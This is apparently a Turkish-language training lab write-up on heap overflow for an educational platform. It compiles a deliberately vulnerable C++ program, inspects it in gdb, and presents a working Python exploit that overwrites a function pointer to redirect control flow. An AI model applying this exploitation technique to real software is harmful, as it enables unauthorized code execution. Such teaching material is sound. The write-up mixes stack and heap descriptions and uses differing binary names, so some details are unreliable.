# CyberLabs: Heap Overflow (Yığın Taşması) Zafiyeti Laboratuvarı

**Modül Kodu:** CL-MEM-004

**Seviye:** Orta / İleri

**Konu:** Bellek Bozulması Zafiyetleri (Memory Corruption)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, bellek bozulması zafiyetlerinin en klasik türlerinden biri olan **Heap Overflow (Yığın Taşması)** konusunu ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

  - Heap Overflow zafiyetinin temel mekanizmasını ve program kontrol akışı üzerindeki etkisini anlamak.
  - Bitişik bellek bloklarının birbirini nasıl etkilediğini pratik olarak gözlemlemek.
  - `g++`, `objdump` ve `gdb` gibi araçlarla bir program üzerinde statik ve dinamik analiz gerçekleştirmek.
  - Kontrol edilen bir laboratuvar ortamında, programın kontrol akışını değiştirmeye yönelik fonksiyonel bir exploit (sömürü kodu) geliştirmek.

## Heap Overflow (Yığın Taşması)

Bu taşma türü, programcının malloc veya new gibi komutlarla çalışma zamanında (runtime) dinamik olarak bellek ayırdığı yığın (heap) bölgesinde gerçekleşir. 

Stack overflow zafiyetinden farklı olarak, heap'te doğrudan üzerine yazılabilecek bir geri dönüş adresi bulunmaz. Bunun yerine saldırgan, bir heap tamponunu taşırarak, bellekte ona komşu olan başka bir nesnenin verilerini (örneğin bir nesneye ait fonksiyon işaretçisini) veya bellek yöneticisinin (malloc/free) kullandığı metadata'yı (bellek bloğunun boyutu, sonraki bloğun adresi vb.) bozar. 

Heap metadata'sının bozulması, dolaylı yoldan bellekte istenen herhangi bir yere, istenen herhangi bir veriyi yazma ("arbitrary write") yeteneği kazandırabilir ve bu da eninde sonunda kod çalıştırmayla sonuçlanabilir. 

## Disclaimer / Yasal Uyarı

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

Bu blog yazısında sağlanan bilgiler yalnızca eğitim ve bilgilendirme amaçlıdır. Bilgisayar korsanlığı, siber saldırılar veya bilgisayar sistemlerine, ağlara veya verilere herhangi bir şekilde yetkisiz erişim de dahil olmak üzere herhangi bir yasa dışı veya etik olmayan faaliyeti teşvik etme veya reklamlama amacı taşımaz.

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

## Senaryo

Laboratuvar senaryosu, iki ana bileşenden oluşmaktadır:

1.  `heap_overflow.cpp`: İçerisinde kasıtlı olarak bir Heap Overflow zafiyeti barındıran, C++ ile yazılmış hedef uygulama.
2.  `exploit_heap.py`: Zafiyetli uygulamadaki açığı tetikleyerek programın akışını değiştiren ve önceden belirlenmiş bir fonksiyonu çağıran Python sömürü kodu.

## Kurulum ve Çalıştırma Adımları

### Örnek Kod İncelemesi

Şimdi zafiyeti analiz etmek için derlememiz gerekiyor. Kodumuzu derlemek için
```bash
g++ -o heap_overflow_cpp heap_overflow.cpp -no-pie -g -fno-stack-protector
```
komutunu kullanıyoruz. Yine geçtiğimiz konuda anlattığımız şekilde derliyoruz. Burada "-fno-stack-protector" komutuyla stack alanı korumasını kapatıyoruz.

<img width="684" height="108" alt="resim" src="https://github.com/user-attachments/assets/e7106ee3-3000-4bac-a873-2fd00e7dbc0a" />

<img width="534" height="175" alt="resim" src="https://github.com/user-attachments/assets/6829903b-6b92-493c-a3f5-d61d06142b10" />

<img width="477" height="97" alt="resim" src="https://github.com/user-attachments/assets/f795628c-82a0-4b54-8e70-31197d660f96" />

Derleme aşamamız tamamlandıktan sonra şimdi zafiyeti test etmek için limitin üzerinde değer girdiğimizde "segmentation fault" hatasını alıyoruz. Bu hata üzerine GDB ile incelememizi yapmaya başlıyoruz.

<img width="621" height="362" alt="resim" src="https://github.com/user-attachments/assets/c769cfc9-f231-4c43-9b0f-66e96b958057" />

Bu aşamanın ardından "disassemble main" komutunu kullanarak main fonksiyonunu disassemble ederek kodu incelemeye başlıyoruz.

<img width="927" height="543" alt="resim" src="https://github.com/user-attachments/assets/b0d6d329-2c18-4ede-b338-b0dd2fc92c85" />

<img width="648" height="323" alt="resim" src="https://github.com/user-attachments/assets/a90850fe-a926-4cea-ae32-86fc403d2bac" />

<img width="488" height="61" alt="resim" src="https://github.com/user-attachments/assets/32fcf289-3ec1-432a-b5e4-3c656a5ff7cd" />

Ardından incelememize devam ederken bir scanf fonksiyonunu tespit ediyoruz. Burada scanf fonksiyonunu görüyoruz. Fonksiyonun ardından kullanıcı pointer verisinin (rax + 0x28 verisi) stack üzerinden RAX'e yüklendiğini ve ardından RAX değerinin çağırıldığını görüyoruz.

Bu noktada aslında zafiyetin varlığını ispatlamış oluyoruz. Zira burada 0x28'i hesapladığımızda 40 baytlık bir limit verildiğini görüyoruz. Burası bizim için birinci çinko diyebileceğimiz bölümdür.

Şimdi bize gereken 40 bayttan yüksek bir veri dosyası olacağı için bir Python scripti yazmamız gerekiyor. Bunun için çok kısa bir Python kodu hazırlıyoruz.

```python
python3 -c 'with open("test_payload.bin", "wb") as f: f.write(b"A" * 43)'
# Padding size : 40
```

<img width="616" height="54" alt="resim" src="https://github.com/user-attachments/assets/285a139b-59c4-4f7d-a45b-d193aabd977e" />

<img width="720" height="495" alt="resim" src="https://github.com/user-attachments/assets/ac36a495-a1b4-4448-8a6b-714f27d52352" />

Kodu oluşturduktan sonra "run < test_payload.bin" komutunu çalıştırdığımızda ikinci çinko da yaparak zafiyetin varlığını doğruluyoruz. Evet, 40 bayt üzerinde gönderilen değerlerde programımız overflow yaşamaktadır.

<img width="929" height="219" alt="resim" src="https://github.com/user-attachments/assets/3f7c64d2-42f6-455d-8295-315556001837" />

Zafiyeti doğruladıktan sonra artık enjekte edeceğimiz fonksiyonu tespit etmeliyiz. Yani içerisindeki bir fonksiyonu akışta olmamasına rağmen uygulatmaya çalışacağız. Bu fonksiyon da "0x401166" oluyor. Şimdi Python ile exploitimizi yazıyoruz.

Daha önceki konumuzda nasıl yazıldığını detaylıca açıkladığım için adım adım açıklamak yerine tam kod üzerinden detaylara ineceğim. 

```python
import struct
import subprocess
import sys

VICTIM_PROGRAM = "./zafiyetli_sunucu"
PADDING_SIZE = 40
TARGET_ADDRESS = 0x401166

def main():
    print("--- [SALDIRGAN] Direkt Heap Overflow Exploit Baslatildi ---")
    
    print(f"[*] Hedef Adres: {hex(TARGET_ADDRESS)}")
    print(f"[*] Padding Boyutu: {PADDING_SIZE}")
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
    payload = padding + overwrite_address
    print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
    
    try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi.")
        sys.exit(1)
        
    print("[*] Payload kurban programa gonderiliyor...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("--- Kurban Programdan Gelen Hata Ciktisi (varsa) ---")
    print(stderr_output)
    
    if "KONTROL ELE GECIRILDI" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu.")

if __name__ == "__main__":
    main()
```
Tam kodda dikkat edilmesi gereken kısım,
```python
padding = b'A' * PADDING_SIZE
overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
payload = padding + overwrite_address
```
Yani burada payload'ı oluşturuyoruz ve aslında tüm olay burada bitiyor. Sömürü kodumuzu yazmamızın ardından şöyle bir mesaj almalıyız.

<img width="492" height="299" alt="resim" src="https://github.com/user-attachments/assets/496fbc26-b200-4ee9-b62e-37bcbcad45ad" />

Okuduğunuz için teşekkür ederim. Sorularınızı yorumlarda belirtebilirsiniz.
